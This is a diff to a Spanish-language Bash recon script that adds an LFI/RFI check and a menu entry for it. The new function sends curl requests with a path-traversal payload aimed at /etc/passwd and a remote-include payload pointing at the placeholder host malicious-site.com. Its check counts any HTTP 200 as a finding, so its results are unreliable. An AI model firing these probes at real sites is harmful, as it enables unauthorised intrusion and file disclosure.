@@ -136,6 +136,30 @@ descubrir_subdominios() {
     esac        
 }
 
+escanear_lfi_rfi_vuln () {
+    echo "Introduce la URL para comprobar si es vulnerable a RFI o LFI"
+    read input
+
+    # Perform checks for LFI and RFI vulnerabilities
+    echo "Comprobando vulnerabilidades en $input..."
+    
+    # Perform LFI check
+    lfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=../../../../etc/passwd")
+    if [ $lfi_result -eq 200 ]; then
+        echo "Vulnerabilidad LFI detectada en $input"
+    else
+        echo "No se detecta vulnerabilidad LF en $input"
+    fi
+
+    # Perform RFI check
+    rfi_result=$(curl -s -o /dev/null -w "%{http_code}" "$input?page=http://malicious-site.com/malicious-script.php")
+    if [ $rfi_result -eq 200 ]; then
+        echo "Vulnerabilidad RFI detectada en $input"
+    else
+        echo "No se detecta ninguna vulnerabilidad RFI en $input"
+    fi
+}
+
 # # LLamar a funcion para obtener IP o URL
 # obtener_direccion_ip
 
@@ -165,6 +189,7 @@ opciones_escaneo() {
     echo "2. Escaneo de puertos y directorios"
     echo "3. Escaneo de directorios y subdominios"
     echo "4. Elegir solo uno de los escaneos"
+    echo
 
     read opcion
 
@@ -187,6 +212,7 @@ opciones_escaneo() {
             echo "a. Escaneo de puertos"
             echo "b. Escaneo de directorios"
             echo "c. Descubrir subdominios"
+            echo "d. Escaneo posible LFI"
 
             read escaneo
 
@@ -199,6 +225,9 @@ opciones_escaneo() {
                     ;;
                 c)
                     descubrir_subdominios
+                    ;;
+                d)
+                    escanear_lfi_rfi_vuln
                     ;;
                 *)
                     echo "Opción no válida."
